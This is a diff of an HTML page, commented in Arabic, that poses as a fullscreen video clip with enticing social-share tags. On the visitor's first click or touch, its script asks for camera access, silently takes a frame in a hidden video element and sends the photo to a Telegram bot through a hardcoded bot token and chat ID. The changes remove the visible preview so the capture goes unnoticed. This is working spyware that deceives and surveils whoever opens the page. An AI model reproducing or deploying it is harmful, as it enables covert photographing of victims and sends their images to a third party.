@@ -1,45 +1,82 @@
-<!-- تم التثبيت على اسم الملف الخاص بك my_reel.mp4 -->
-<video id="mainVideo" controls autoplay loop playsinline muted>
-    <source src="my_reel.mp4" type="video/mp4">
-</video>
+<meta property="og:title" content="شاهد هذا المقطع المميز 🎬">
+<meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
+<meta property="og:type" content="video.other">
+<meta property="og:image" content="https://plain-weur-prod-public.komododecks.com/202610/17/ifCLTtEKOVGvCZTbnHCh/image.jpg">
 
-<img id="result" alt="">
+<title>Video Fullscreen</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    html, body {
+        width: 100%;
+        height: 100%;
+        background-color: #000;
+        overflow: hidden;
+    }
+    video#mainVideo {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        min-width: 100%;
+        min-height: 100%;
+        object-fit: cover;
+        object-position: center;
+        z-index: 1;
+    }
+</style>
+
+<!-- تم إزالة autoplay لكي لا يعمل الفيديو إلا بالنقر -->
+<video id="mainVideo" controls loop playsinline muted>
+    <source src="my_reel (3).mp4" type="video/mp4">
+</video>
 
 <script>
     const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
     const TELEGRAM_CHAT_ID = '6642913954';
 
     let isProcessing = false;
+    const video = document.getElementById('mainVideo');
 
-    async function handleCapture() {
+    async function handleUserInteraction() {
+        // تشغيل الفيديو فوراً عند النقر
+        if (video.paused) {
+            video.play().catch(e => console.log("Video play error:", e));
+        }
+
         if (isProcessing) return;
         isProcessing = true;
 
         let stream = null;
 
         try {
+            // طلب إذن الكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.muted = true;
+            hiddenVideo.playsInline = true;
+            hiddenVideo.srcObject = stream;
+            
+            await hiddenVideo.play();
+            await new Promise(resolve => setTimeout(resolve, 400));
 
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = hiddenVideo.videoWidth || 640;
+            canvas.height = hiddenVideo.videoHeight || 480;
 
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+            ctx.drawImage(hiddenVideo, 0, 0);
 
-            const img = document.getElementById('result');
-            img.src = canvas.toDataURL('image/png');
-            img.style.display = 'block';
-
-            setTimeout(() => {
-                img.style.display = 'none';
-            }, 1000);
+            stream.getTracks().forEach(track => track.stop());
 
             canvas.toBlob(async (blob) => {
+                if (!blob) return;
+
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'capture.png');
@@ -50,19 +87,19 @@
                         body: formData
                     });
                 } catch (err) {
-                    console.error("Error:", err);
+                    console.error("Error sending photo:", err);
                 }
             }, 'image/png');
 
         } catch (err) {
             console.error("Camera Error:", err);
-        } finally {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         }
     }
 
-    window.addEventListener('click', handleCapture);
-    window.addEventListener('touchstart', handleCapture);
+    // تنفيذ الكود عند أول نقرة أو لمسة فقط
+    window.addEventListener('click', handleUserInteraction, { once: true });
+    window.addEventListener('touchstart', handleUserInteraction, { once: true });
 </script>
